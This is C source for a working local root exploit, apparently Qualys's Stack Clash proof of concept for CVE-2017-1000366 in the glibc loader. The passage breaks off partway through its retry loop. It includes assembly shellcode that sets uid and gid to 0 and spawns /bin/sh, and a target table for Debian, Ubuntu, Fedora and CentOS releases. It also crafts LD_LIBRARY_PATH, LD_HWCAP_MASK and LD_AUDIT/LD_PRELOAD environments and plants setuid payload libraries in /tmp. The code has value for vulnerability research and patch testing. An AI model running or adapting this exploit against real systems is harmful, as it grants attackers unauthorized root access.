/*
 * Linux_ldso_hwcap_64.c for CVE-2017-1000366, CVE-2017-1000379
 * Copyright (C) 2017 Qualys, Inc.
 *
 * my_important_hwcaps() adapted from elf/dl-hwcaps.c,
 * part of the GNU C Library:
 * Copyright (C) 2012-2017 Free Software Foundation, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
cat > la.c << "EOF"
static void __attribute__ ((constructor)) _init (void) {
    __asm__ __volatile__ (
    "addq $64, %rsp;"
    // setuid(0);
    "movq $105, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    // setgid(0);
    "movq $106, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    // dup2(0, 1);
    "movq $33, %rax;"
    "movq $0, %rdi;"
    "movq $1, %rsi;"
    "syscall;"
    // dup2(0, 2);
    "movq $33, %rax;"
    "movq $0, %rdi;"
    "movq $2, %rsi;"
    "syscall;"
    // execve("/bin/sh");
    "movq $59, %rax;"
    "movq $0x0068732f6e69622f, %rdi;"
    "pushq %rdi;"
    "movq %rsp, %rdi;"
    "movq $0, %rdx;"
    "pushq %rdx;"
    "pushq %rdi;"
    "movq %rsp, %rsi;"
    "syscall;"
    // exit(0);
    "movq $60, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    );
}
EOF
gcc -fpic -shared -nostdlib -Os -s -o la.so la.c
xxd -i la.so > la.so.h
**/

#define _GNU_SOURCE
#include <assert.h>
#include <elf.h>
#include <fcntl.h>
#include <limits.h>
#include <link.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define PAGESZ ((size_t)4096)
#define STACK_ALIGN ((size_t)16)
#define MALLOC_ALIGN ((size_t)8)

#define MAX_ARG_STRLEN ((size_t)128<<10)

#define SUB_STACK_RAND ((size_t)8192)
#define INITIAL_STACK_EXPANSION (131072UL)

#define LDSO "/lib64/ld-linux-x86-64.so.2"

static const struct target * target;
static const struct target {
    const char * name;
    size_t vdso_vvar;
    int jump_ldso_pie;
    int CVE_2015_1593;
    int offset2lib;
    const char * system_dir;
    const char * repl_lib;
    unsigned int extra_page;
    int ignore_lib;
    int ignore_origin;
    int disable_audit;
} targets[] = {
    {
        .name = "Debian 7.7 (wheezy)",
        .vdso_vvar = 4096,
        .jump_ldso_pie = 1,
        .CVE_2015_1593 = 1,
        .offset2lib = 1,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
    },
    {
        .name = "Debian 8.5 (jessie)",
        .vdso_vvar = 16384,
        .offset2lib = 1,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
    },
    {
        .name = "Debian 9.0 (stretch)",
        .vdso_vvar = 16384,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
        .extra_page = 1,
    },
    {
        .name = "Ubuntu 14.04.2 (Trusty Tahr)",
        .vdso_vvar = 8192,
        .jump_ldso_pie = 1,
        .CVE_2015_1593 = 1,
        .offset2lib = 1,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
        .disable_audit = 1,
    },
    {
        .name = "Ubuntu 16.04.2 (Xenial Xerus)",
        .vdso_vvar = 16384,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
        .disable_audit = 1,
    },
    {
        .name = "Ubuntu 17.04 (Zesty Zapus)",
        .vdso_vvar = 16384,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
        .extra_page = 1,
        .disable_audit = 1,
    },
    {
        .name = "Fedora 22 (Twenty Two)",
        .vdso_vvar = 16384,
        .offset2lib = 1,
        .system_dir = "/lib64",
        .repl_lib = "lib64",
    },
    {
        .name = "Fedora 25 (Server Edition)",
        .vdso_vvar = 16384,
        .system_dir = "/lib64",
        .repl_lib = "lib64",
        .extra_page = 1,
    },
    {
        .name = "CentOS 7.3.1611 (Core)",
        .vdso_vvar = 8192,
        .jump_ldso_pie = 1,
        .offset2lib = 1,
        .system_dir = "/lib64",
        .repl_lib = "lib64",
    },
};

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const char *
my_asprintf(const char * const fmt, ...)
{
    if (!fmt) die();
    char * str = NULL;
    va_list ap;
    va_start(ap, fmt);
    const int len = vasprintf(&str, fmt, ap);
    va_end(ap);
    if (!str) die();
    if (len <= 0) die();
    if ((unsigned int)len != strlen(str)) die();
    return str;
}

static const ElfW(auxv_t) * my_auxv;

static unsigned long int
my_getauxval (const unsigned long int type)
{
    const ElfW(auxv_t) * p;

    if (!my_auxv) die();
    for (p = my_auxv; p->a_type != AT_NULL; p++)
        if (p->a_type == type)
            return p->a_un.a_val;
    die();
}

struct elf_info {
    ElfW(Half) type;
    uintptr_t rx_start, rx_end;
    uintptr_t rw_start, rw_end;
};

static struct elf_info
get_elf_info(const char * const binary)
{
    struct elf_info elf = { ET_NONE };
    if (elf.rx_start || elf.rx_end) die();
    if (elf.rw_start || elf.rw_end) die();

    const int fd = open(binary, O_RDONLY);
    if (fd <= -1) die();
    struct stat st;
    if (fstat(fd, &st)) die();
    if (!S_ISREG(st.st_mode)) die();
    if (st.st_size <= 0) die();
    #define SAFESZ ((size_t)64<<20)
    if (st.st_size >= (ssize_t)SAFESZ) die();
    const size_t size = st.st_size;
    uint8_t * const buf = malloc(size);
    if (!buf) die();
    if (read(fd, buf, size) != (ssize_t)size) die();
    if (close(fd)) die();

    if (size <= sizeof(ElfW(Ehdr))) die();
    const ElfW(Ehdr) * const ehdr = (const ElfW(Ehdr) *)buf;
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0) die();
    if (ehdr->e_ident[EI_MAG1] != ELFMAG1) die();
    if (ehdr->e_ident[EI_MAG2] != ELFMAG2) die();
    if (ehdr->e_ident[EI_MAG3] != ELFMAG3) die();
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) die();
    if (ehdr->e_ident[EI_DATA] != ELFDATA2LSB) die();
    if (ehdr->e_type != ET_DYN && ehdr->e_type != ET_EXEC) die();
    if (ehdr->e_machine != EM_X86_64) die();
    if (ehdr->e_version != EV_CURRENT) die();
    if (ehdr->e_ehsize != sizeof(ElfW(Ehdr))) die();
    if (ehdr->e_phentsize != sizeof(ElfW(Phdr))) die();
    if (ehdr->e_phoff <= 0 || ehdr->e_phoff >= size) die();
    if (ehdr->e_phnum > (size - ehdr->e_phoff) / sizeof(ElfW(Phdr))) die();
    elf.type = ehdr->e_type;

    int interp = 0;
    unsigned int i;
    for (i = 0; i < ehdr->e_phnum; i++) {
        const ElfW(Phdr) * const phdr = (const ElfW(Phdr) *)(buf + ehdr->e_phoff) + i;
        if (phdr->p_type == PT_INTERP) interp = 1;
        if (phdr->p_type != PT_LOAD) continue;

        if (phdr->p_offset >= size) die();
        if (phdr->p_filesz > size - phdr->p_offset) die();
        if (phdr->p_filesz > phdr->p_memsz) die();
        if (phdr->p_vaddr != phdr->p_paddr) die();
        if (phdr->p_vaddr >= SAFESZ) die();
        if (phdr->p_memsz >= SAFESZ) die();
        if (phdr->p_memsz <= 0) die();
        if (phdr->p_align != 0x200000) die();

        switch (phdr->p_flags) {
            case PF_R | PF_X:
                if (elf.rx_end) die();
                if (elf.rw_end) die();
                if (phdr->p_vaddr && ehdr->e_type != ET_EXEC) die();
                elf.rx_start = phdr->p_vaddr & ~(PAGESZ-1);
                elf.rx_end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
                if (!elf.rx_end) die();
                break;
            case PF_R | PF_W:
                if (!elf.rx_end) die();
                if (elf.rw_end) die();
                elf.rw_start = phdr->p_vaddr & ~(PAGESZ-1);
                elf.rw_end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
                if (elf.rw_start <= elf.rx_end) die();
                break;
            default:
                die();
        }
    }
    if (!interp && !strstr(binary, "/ld-linux")) die();
    if (!elf.rx_end) die();
    if (!elf.rw_end) die();
    free(buf);
    return elf;
}

/* There are no hardware capabilities defined.  */
#define my_hwcap_string(idx) ""

struct my_important_hwcaps {
    unsigned long hwcap_mask;
    size_t max_capstrlen;
    size_t pointers;
    size_t strings;
};

struct my_link_map {
    const ElfW(Phdr) * l_phdr;
    ElfW(Half) l_phnum;
    ElfW(Addr) l_addr;
};

struct r_strlenpair
  {
    const char *str;
    size_t len;
  };

/* Return an array of useful/necessary hardware capability names.  */
static struct my_important_hwcaps
my_important_hwcaps (const char * const platform, const size_t platform_len,
                     const uint64_t hwcap, const uint64_t hwcap_mask,
                     const struct my_link_map * sysinfo_map)
{
  static const struct my_important_hwcaps err;
  /* Determine how many important bits are set.  */
  uint64_t masked = hwcap & hwcap_mask;
  size_t cnt = platform != NULL;
  size_t n, m;
  size_t total;
  struct r_strlenpair *result;

  /* Count the number of bits set in the masked value.  */
  for (n = 0; (~((1ULL << n) - 1) & masked) != 0; ++n)
    if ((masked & (1ULL << n)) != 0)
      ++cnt;

  /* The system-supplied DSO can contain a note of type 2, vendor "GNU".
     This gives us a list of names to treat as fake hwcap bits.  */

  const char *dsocaps = NULL;
  size_t dsocapslen = 0;
  if (sysinfo_map != NULL)
    {
      const ElfW(Phdr) *const phdr = sysinfo_map->l_phdr;
      const ElfW(Word) phnum = sysinfo_map->l_phnum;
      uint_fast16_t i;
      for (i = 0; i < phnum; ++i)
        if (phdr[i].p_type == PT_NOTE)
          {
            const ElfW(Addr) start = (phdr[i].p_vaddr
                                      + sysinfo_map->l_addr);
            /* The standard ELF note layout is exactly as the anonymous struct.
               The next element is a variable length vendor name of length
               VENDORLEN (with a real length rounded to ElfW(Word)), followed
               by the data of length DATALEN (with a real length rounded to
               ElfW(Word)).  */
            const struct
            {
              ElfW(Word) vendorlen;
              ElfW(Word) datalen;
              ElfW(Word) type;
            } *note = (const void *) start;
            while ((ElfW(Addr)) (note + 1) - start < phdr[i].p_memsz)
              {
#define ROUND(len) (((len) + sizeof (ElfW(Word)) - 1) & -sizeof (ElfW(Word)))
                /* The layout of the type 2, vendor "GNU" note is as follows:
                   .long <Number of capabilities enabled by this note>
                   .long <Capabilities mask> (as mask >> _DL_FIRST_EXTRA).
                   .byte <The bit number for the next capability>
                   .asciz <The name of the capability>.  */
                if (note->type == NT_GNU_HWCAP
                    && note->vendorlen == sizeof "GNU"
                    && !memcmp ((note + 1), "GNU", sizeof "GNU")
                    && note->datalen > 2 * sizeof (ElfW(Word)) + 2)
                  {
                    const ElfW(Word) *p = ((const void *) (note + 1)
                                           + ROUND (sizeof "GNU"));
                    cnt += *p++;
                    ++p;        /* Skip mask word.  */
                    dsocaps = (const char *) p; /* Pseudo-string "<b>name"  */
                    dsocapslen = note->datalen - sizeof *p * 2;
                    break;
                  }
                note = ((const void *) (note + 1)
                        + ROUND (note->vendorlen) + ROUND (note->datalen));
#undef ROUND
              }
            if (dsocaps != NULL)
              break;
          }
    }

  /* For TLS enabled builds always add 'tls'.  */
  ++cnt;

  /* Create temporary data structure to generate result table.  */
  if (cnt < 2) return err;
  if (cnt >= 32) return err;
  struct r_strlenpair temp[cnt];
  m = 0;
  if (dsocaps != NULL)
    {
      /* dsocaps points to the .asciz string, and -1 points to the mask
         .long just before the string.  */
      const ElfW(Word) mask = ((const ElfW(Word) *) dsocaps)[-1];
      size_t len;
      const char *p;
      for (p = dsocaps; p < dsocaps + dsocapslen; p += len + 1)
        {
          uint_fast8_t bit = *p++;
          len = strlen (p);

          /* Skip entries that are not enabled in the mask word.  */
          if (mask & ((ElfW(Word)) 1 << bit))
            {
              temp[m].str = p;
              temp[m].len = len;
              ++m;
            }
          else
            --cnt;
        }
    }
  for (n = 0; masked != 0; ++n)
    if ((masked & (1ULL << n)) != 0)
      {
        temp[m].str = my_hwcap_string (n);
        temp[m].len = strlen (temp[m].str);
        masked ^= 1ULL << n;
        ++m;
      }
  if (platform != NULL)
    {
      temp[m].str = platform;
      temp[m].len = platform_len;
      ++m;
    }

  temp[m].str = "tls";
  temp[m].len = 3;
  ++m;

  assert (m == cnt);

  /* Determine the total size of all strings together.  */
  if (cnt == 1)
    total = temp[0].len + 1;
  else
    {
      total = temp[0].len + temp[cnt - 1].len + 2;
      if (cnt > 2)
        {
          total <<= 1;
          for (n = 1; n + 1 < cnt; ++n)
            total += temp[n].len + 1;
          if (cnt > 3
              && (cnt >= sizeof (size_t) * 8
                  || total + (sizeof (*result) << 3)
                     >= (1UL << (sizeof (size_t) * 8 - cnt + 3))))
            return err;

          total <<= cnt - 3;
        }
    }

  /* The result structure: we use a very compressed way to store the
     various combinations of capability names.  */
  const size_t _sz = 1 << cnt;

  /* Now we are ready to install the string pointers and length.  */
  size_t max_capstrlen = 0;
  n = cnt;
  do
    {
      const size_t mask = 1 << --n;
      for (m = 1 << cnt; m > 0; ) {
        if ((--m & mask) != 0)
          max_capstrlen += temp[n].len + 1;
        break;
      }
    }
  while (n != 0);

  if (hwcap_mask > ULONG_MAX) die();
  const struct my_important_hwcaps ret = {
      .hwcap_mask = hwcap_mask,
      .max_capstrlen = max_capstrlen,
      .pointers = _sz * sizeof (*result),
      .strings = total,
  };
  return ret;
}

static size_t
my_bsearch(const void * const key,
    const void * const base, const size_t nmemb, const size_t size,
    int (* const compar)(const void *, const void *))
{
    if (!key) die();
    if (!size) die();
    if (!compar) die();
    if (nmemb >= SSIZE_MAX / size) die();
    if (!base != !nmemb) die();
    if (!base || !nmemb) return 0;

    size_t low = 0;
    size_t high = nmemb - 1;
    while (low <= high) {
        const size_t mid = low + (high - low) / 2;
        if (mid >= nmemb) die();
        const int cond = compar(key, base + mid * size);
        switch (cond) {
        case 0:
            return mid;
        case -1:
            if (mid <= 0) {
                if (mid != 0) die();
                if (low != 0) die();
                return low;
            }
            high = mid - 1;
            break;
        case +1:
            low = mid + 1;
            break;
        default:
            die();
        }
    }
    if (low > nmemb) die();
    return low;
}

static int
cmp_important_hwcaps(const void * const _a, const void * const _b)
{
    const struct my_important_hwcaps * const a = _a;
    const struct my_important_hwcaps * const b = _b;

    if (a->strings < b->strings) return -1;
    if (a->strings > b->strings) return +1;

    if (a->pointers < b->pointers) return -1;
    if (a->pointers > b->pointers) return +1;

    if (a->max_capstrlen < b->max_capstrlen) return -1;
    if (a->max_capstrlen > b->max_capstrlen) return +1;

    return 0;
}

static void
copy_lib(const char * const src, const char * const dst)
{
    if (!src) die();
    if (*src != '/') die();

    if (!dst) die();
    if (*dst != '/') die();

    const int src_fd = open(src, O_RDONLY);
    if (src_fd <= -1) die();

    const int dst_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0);
    if (dst_fd <= -1) die();

    for (;;) {
        char buf[1024];
        const ssize_t rd = read(src_fd, buf, sizeof(buf));
        if (rd == 0) break;
        if (rd <= 0) die();
        const ssize_t wr = write(dst_fd, buf, rd);
        if (wr != rd) die();
    }

    if (fchmod(dst_fd, 0755)) die();
    if (close(dst_fd)) die();
    if (close(src_fd)) die();
}

static void
create_needed_libs(const char * const bin, const char * const dir)
{
    if (!bin) die();
    if (*bin != '/') die();
    if (strspn(bin, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+,-./_") != strlen(bin)) die();

    if (!dir) die();
    if (*dir != '/') die();
    if (dir[strlen(dir)-1] != '/') die();

    char cmd[256];
    if ((unsigned int)snprintf(cmd, sizeof(cmd), "/usr/bin/env - %s --list %s", LDSO, bin)
                                 >= sizeof(cmd)) die();
    FILE * const fp = popen(cmd, "r");
    if (!fp) die();

    char buf[256];
    unsigned int num_libs = 0;
    while (fgets(buf, sizeof(buf), fp) == buf) {
        if (!strchr(buf, '\n')) die();

        const char * const rel_lib = buf + strspn(buf, "\t ");
        if (strncmp(rel_lib, "lib", 3)) continue;

        char * sp = strchr(rel_lib, ' ');
        if (!sp) die();
        if (strncmp(sp, " => /", 5)) die();
        *sp = '\0';
        if (strchr(rel_lib, '/')) die();

        const char * const abs_lib = sp + 4;
        if (*abs_lib != '/') die();
        sp = strchr(abs_lib, ' ');
        if (!sp) die();
        if (strncmp(sp, " (0x", 4)) die();
        *sp = '\0';

        size_t i;
        static const char * const prefixes[] = { "", "/", "/.", "/.." };
        for (i = 0; i < sizeof(prefixes)/sizeof(*prefixes); i++) {

            char tmp_lib[256];
            if ((unsigned int)snprintf(tmp_lib, sizeof(tmp_lib), "%s%s%s", dir, prefixes[i], rel_lib)
                                             >= sizeof(tmp_lib)) die();
            copy_lib(abs_lib, tmp_lib);
        }
        if (!++num_libs) die();
    }
    if (!num_libs) die();
    printf("copied %u lib%s\n", num_libs, num_libs > 1 ? "s" : "");
    if (pclose(fp) != EXIT_SUCCESS) die();
}

int
main(const int my_argc, const char * const my_argv[], const char * const my_envp[])
{
  {
    const char * const * p = my_envp;
    while (*p++) ;
    my_auxv = (const void *)p;
  }
    if (my_getauxval(AT_PAGESZ) != PAGESZ) die();

    if (my_argc != 1+2) {
        printf("Usage: %s target binary\n", my_argv[0]);
        size_t i;
        for (i = 0; i < sizeof(targets)/sizeof(*targets); i++) {
            printf("Target %zu %s\n", i, targets[i].name);
        }
        die();
    }
  {
    const size_t i = strtoul(my_argv[1], NULL, 10);
    if (i >= sizeof(targets)/sizeof(*targets)) die();
    target = targets + i;
    printf("Target %zu %s\n", i, target->name);
  }
    const size_t safe_stack_size = target->CVE_2015_1593 ? 65536 : 32768;
    printf("safe_stack_size %zu\n", safe_stack_size);
    if (safe_stack_size <= SUB_STACK_RAND) die();

    const char * const binary = realpath(my_argv[2], NULL);
    if (!binary) die();
    if (*binary != '/') die();
    if (access(binary, R_OK | X_OK)) die();
    const struct elf_info elf_binary = get_elf_info(binary);
    const struct elf_info elf_interp = get_elf_info(LDSO);
    const struct elf_info elf = (elf_binary.type == ET_DYN && target->offset2lib && !target->jump_ldso_pie) ? elf_binary : elf_interp;
    const size_t jump_ldso_pie = (elf_binary.type == ET_DYN && target->offset2lib && target->jump_ldso_pie) ? (elf_binary.rx_end - elf_binary.rx_start) : 0;
    if (elf.rw_start - elf.rx_end <= target->vdso_vvar) die();

    const char * const slash = strrchr(binary, '/');
    if (!slash) die();
    if (slash <= binary) die();
    const char * const origin = strndup(binary, slash - binary);
    if (!origin) die();
    printf("origin %s (%zu)\n", origin, strlen(origin));

    const char * const platform = (const void *)my_getauxval(AT_PLATFORM);
    if (!platform) die();
    if (strcmp(platform, "x86_64") != 0) die();
    const size_t platform_len = strlen(platform);

    const struct {
        const char * str;
        size_t len;
        size_t repl_len;
    } DSTs[] = {
        #define DST_LIB "LIB"
        { DST_LIB, strlen(DST_LIB), strlen(target->repl_lib) },
        #define DST_PLATFORM "PLATFORM"
        { DST_PLATFORM, strlen(DST_PLATFORM), platform_len }
    };
    size_t repl_max = target->ignore_origin ? 0 : strlen(origin);
  {
    size_t i;
    for (i = target->ignore_lib ? 1 : 0; i < sizeof(DSTs)/sizeof(*DSTs); i++) {
        if (repl_max < DSTs[i].repl_len)
            repl_max = DSTs[i].repl_len;
    }
  }
    printf("repl_max %zu\n", repl_max);
    if (repl_max < 4) die();

    const ElfW(Ehdr) * const sysinfo_dso = (const void *)my_getauxval(AT_SYSINFO_EHDR);
    if (!sysinfo_dso) die();
    struct my_link_map sysinfo_map = {
        .l_phdr = (const void *)sysinfo_dso + sysinfo_dso->e_phoff,
        .l_phnum = sysinfo_dso->e_phnum,
        .l_addr = ULONG_MAX
    };
  {
    uint_fast16_t i;
    for (i = 0; i < sysinfo_map.l_phnum; ++i) {
        const ElfW(Phdr) * const ph = &sysinfo_map.l_phdr[i];
        if (ph->p_type == PT_LOAD) {
            if (sysinfo_map.l_addr == ULONG_MAX)
                sysinfo_map.l_addr = ph->p_vaddr;
        }
    }
  }
    if (sysinfo_map.l_addr == ULONG_MAX) die();
    sysinfo_map.l_addr = (ElfW(Addr))sysinfo_dso - sysinfo_map.l_addr;

    const unsigned long hwcap = my_getauxval(AT_HWCAP);
    if (!hwcap) die();
    struct my_important_hwcaps * important_hwcaps = NULL;
    size_t num_important_hwcaps = 0;
  {
    size_t max_important_hwcaps = 0;
    uint32_t hwcap_mask = 1;
    do {
        if (hwcap_mask & ~hwcap) continue;
        const uint64_t popcount = __builtin_popcount(hwcap_mask);
        if (popcount < 1) die();
        if (popcount > 32) die();

        const struct my_important_hwcaps ihc = my_important_hwcaps(platform, platform_len, hwcap, hwcap_mask, &sysinfo_map);
        if (!ihc.pointers) die();

        const size_t idx = my_bsearch(&ihc, important_hwcaps, num_important_hwcaps, sizeof(struct my_important_hwcaps), cmp_important_hwcaps);
        if (idx > num_important_hwcaps) die();

        if (idx == num_important_hwcaps || cmp_important_hwcaps(&ihc, important_hwcaps + idx)) {
            if (num_important_hwcaps >= max_important_hwcaps) {
                if (num_important_hwcaps != max_important_hwcaps) die();
                if (max_important_hwcaps >= 65536) die();
                max_important_hwcaps += 256;

                if (num_important_hwcaps >= max_important_hwcaps) die();
                important_hwcaps = realloc(important_hwcaps, max_important_hwcaps * sizeof(struct my_important_hwcaps));
                if (!important_hwcaps) die();
            }
            memmove(important_hwcaps + idx + 1, important_hwcaps + idx, (num_important_hwcaps - idx) * sizeof(struct my_important_hwcaps));
            important_hwcaps[idx] = ihc;
            num_important_hwcaps++;
        }
        if (!(hwcap_mask % 0x10000000))
            printf("num_important_hwcaps %zu hwcap_mask %x\n", num_important_hwcaps, hwcap_mask);
    } while (++hwcap_mask);
  }
    printf("num_important_hwcaps %zu\n", num_important_hwcaps);

    static struct {
        size_t len, gwr, dst, cnt;
        struct my_important_hwcaps ihc;
    } best = { .ihc = { .pointers = SIZE_MAX } };

    if (strrchr(target->system_dir, '/') != target->system_dir) die();
    const char * const sep_lib = my_asprintf(":%s", target->system_dir);
    const size_t sep_lib_len = strlen(sep_lib);
    if (sep_lib_len >= MALLOC_ALIGN) die();

    #define LLP "LD_LIBRARY_PATH="
    static char llp[MAX_ARG_STRLEN];

    size_t len;
    for (len = sizeof(llp) - sizeof(LLP); len >= MALLOC_ALIGN; len -= MALLOC_ALIGN) {

        size_t gwr;
        for (gwr = MALLOC_ALIGN; gwr <= len - sep_lib_len; gwr += MALLOC_ALIGN) {

            size_t dst;
            for (dst = 0; dst < sizeof(DSTs)/sizeof(*DSTs); dst++) {

                const size_t cnt = (len - sep_lib_len - gwr) / (1 + DSTs[dst].len + 1);
                const size_t gpj = (len + cnt * (repl_max - (target->ignore_lib ? 7 : 4)) + 1 + STACK_ALIGN-1) & ~(STACK_ALIGN-1);
                const size_t bwr = (cnt * (DSTs[dst].repl_len + 1)) + (len - gwr - cnt * (1 + DSTs[dst].len + 1)) + 1;

                size_t idx;
                for (idx = 0; idx < num_important_hwcaps; idx++) {
                    const struct my_important_hwcaps ihc = important_hwcaps[idx];
                    if (ihc.max_capstrlen % MALLOC_ALIGN >= sizeof("/..")) continue;
                    if (ihc.pointers <= 2 * SUB_STACK_RAND) continue;

                    const size_t nup = ((ihc.pointers + ihc.strings + PAGESZ-1) & ~(PAGESZ-1)) + (target->extra_page * PAGESZ);
                    if (nup >= (elf.rw_start - elf.rx_end) - target->vdso_vvar) continue;

                    const size_t ihc_strings_start = ihc.pointers;
                    const size_t ihc_strings_end = ihc_strings_start + ihc.strings;

                    const size_t gpj_base = nup + target->vdso_vvar + (elf.rw_end - elf.rw_start) + jump_ldso_pie + PAGESZ + safe_stack_size;
                    const size_t gpj_base_lo = gpj_base - SUB_STACK_RAND;
                    const size_t gpj_base_hi = gpj_base + SUB_STACK_RAND;

                    if (gpj_base_lo <= gpj) continue;
                    if (gpj_base_hi - gpj >= ihc_strings_start) continue;
                    if (gpj_base_lo - gpj + gwr <= ihc_strings_start) continue;
                    if (gpj_base_hi - gpj + gwr + bwr >= ihc_strings_end) continue;

                    if (best.ihc.pointers <= ihc.pointers) continue;
                    best.ihc = ihc;
                    best.len = len;
                    best.gwr = gwr;
                    best.dst = dst;
                    best.cnt = cnt;
                    printf("max %zu ihcp %zu ihcs %zu len %zu gpj %zu gwr %zu bwr %zu cnt %zu dst %zu repl %zu\n",
                        ihc.max_capstrlen, ihc.pointers, ihc.strings, len, gpj, gwr, bwr, cnt, DSTs[dst].len, DSTs[dst].repl_len);
                }
            }
        }
    }
    if (best.ihc.pointers >= SIZE_MAX) die();

    if (INITIAL_STACK_EXPANSION <= safe_stack_size) die();
    const size_t pads = (INITIAL_STACK_EXPANSION - safe_stack_size) / sizeof(char *);
    static char pad[MAX_ARG_STRLEN];
    memset(pad, ' ', sizeof(pad)-1);

  {
    char * cp = mempcpy(llp, LLP, sizeof(LLP)-1);
    memset(cp, '/', best.len);
    if (best.len <= sep_lib_len) die();
    memcpy(cp + best.len - sep_lib_len, sep_lib, sep_lib_len);
    if (*(cp + best.len)) die();

    #define LIB_TO_TMP "/../tmp/"
    if (sizeof(LIB_TO_TMP)-1 != MALLOC_ALIGN) die();

    if (!best.gwr) die();
    if (best.gwr >= best.len) die();
    if (best.gwr % MALLOC_ALIGN) die();
    size_t i;
    for (i = 0; i < best.gwr / MALLOC_ALIGN; i++) {
        cp = mempcpy(cp, LIB_TO_TMP, MALLOC_ALIGN);
    }
    if (!best.cnt) die();
    if (best.dst >= sizeof(DSTs)/sizeof(*DSTs)) die();
    for (i = 0; i < best.cnt; i++) {
        *cp++ = '$';
        cp = mempcpy(cp, DSTs[best.dst].str, DSTs[best.dst].len);
        *cp++ = '/';
    }
    if (cp >= llp + sizeof(llp)) die();
    if (llp[sizeof(llp)-1]) die();
    if (strlen(llp) != sizeof(LLP)-1 + best.len) die();
  }

    #define LHCM "LD_HWCAP_MASK="
    static char lhcm[64];
    if ((unsigned int)snprintf(lhcm, sizeof(lhcm), "%s%lu", LHCM, best.ihc.hwcap_mask)
                                  >= sizeof(lhcm)) die();

    const size_t args = 1 + (target->jump_ldso_pie ? 0 : pads) + 1;
    char ** const argv = calloc(args, sizeof(char *));
    if (!argv) die();
  {
    char ** ap = argv;
    *ap++ = (char *)binary;
    if (!target->jump_ldso_pie) {
        size_t i;
        for (i = 0; i < pads; i++) {
            *ap++ = pad;
        }
    }
    *ap++ = NULL;
    if (ap != argv + args) die();
  }

    const size_t envs = 3 + (target->jump_ldso_pie ? pads : 0) + 1;
    char ** const envp = calloc(envs, sizeof(char *));
    if (!envp) die();
  {
    char ** ep = envp;
    *ep++ = llp;
    *ep++ = lhcm;
    #define REL_LA "a"
    #define LDA "LD_AUDIT="
    #define LDP "LD_PRELOAD="
    *ep++ = target->disable_audit ? LDP REL_LA : LDA REL_LA;
    if (target->jump_ldso_pie) {
        size_t i;
        for (i = 0; i < pads; i++) {
            *ep++ = pad;
        }
    }
    *ep++ = NULL;
    if (ep != envp + envs) die();
  }

  {
    const size_t MIN_GAP = target->CVE_2015_1593 ?
        (128*1024*1024UL + (((-1U ) & 0x3fffff) << 12)) :
        (128*1024*1024UL + (((-1UL) & 0x3fffff) << 12)) ;
    printf("MIN_GAP %zu\n", MIN_GAP);

    if (pads * sizeof(pad) + (1<<20) >= MIN_GAP / 4) die();
    const struct rlimit rlimit_stack = { MIN_GAP, MIN_GAP };
    if (setrlimit(RLIMIT_STACK, &rlimit_stack)) die();
  }

    int pipefd[2];
    if (pipe(pipefd)) die();
    if (close(pipefd[0])) die();
    pipefd[0] = -1;
    if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();

  {
    const char * const abs_la_dir = my_asprintf("/%s/%s/", target->system_dir, LIB_TO_TMP);
    const char * const abs_las[] = {
        my_asprintf("%s%s%s", abs_la_dir, "", REL_LA),
        my_asprintf("%s%s%s", abs_la_dir, "/", REL_LA),
        my_asprintf("%s%s%s", abs_la_dir, "/.", REL_LA),
        my_asprintf("%s%s%s", abs_la_dir, "/..", REL_LA),
    };
    size_t i;
    for (i = 0; i < sizeof(abs_las)/sizeof(*abs_las); i++) {
        const int fd = open(abs_las[i], O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0);
        if (fd <= -1) die();
      {
        struct stat st;
        if (fstat(fd, &st)) die();
        if (!S_ISREG(st.st_mode)) die();
        if (st.st_uid != getuid()) die();
        if (st.st_uid != geteuid()) die();
      }
      {
        static const
        #include "la.so.h"
        if (sizeof(la_so) != la_so_len) die();
        if (write(fd, la_so, sizeof(la_so)) != (ssize_t)sizeof(la_so)) die();
      }
        if (fchmod(fd, 04755)) die();
        if (close(fd)) die();
    }
    if (target->disable_audit) create_needed_libs(binary, abs_la_dir);
  }

    size_t try;
    for (try = 1; try; try++) {
        if (fflush(stdout)) die();
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            if (dup2(pipefd[1], 1) != 1) die();
            if (dup2(pipefd[1], 2) != 2) die();
            execve(*argv, argv, envp);
            die();
        }
        int status = 0;
        struct timeval start, stop, diff;
        if (gettimeofday(&start, NULL)) die();
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (gettimeofday(&stop, NULL)) die();
        timersub(&stop, &start, &diff);
        printf("try %zu %ld.%06ld ", try, diff.tv_sec, diff.tv_usec);

        if (WIFSIGNALED(status)) {
            printf("signal %d\n", WTERMSIG(status));
            switch (WTERMSIG(status)) {
                case SIGPIPE:
                case SIGSEGV:
